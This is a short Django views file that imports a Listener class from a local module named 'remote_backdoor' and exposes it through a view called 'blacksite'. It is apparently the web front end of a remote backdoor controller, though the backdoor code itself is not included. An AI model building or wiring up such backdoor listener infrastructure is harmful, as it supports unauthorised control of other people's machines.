from django.shortcuts import render
from .scripts.remote_backdoor import Listener

# Create your views here.


def blacksite(request):
    backdoor = Listener()
    return render(request,'partials/index.html',{'backdoor':backdoor})
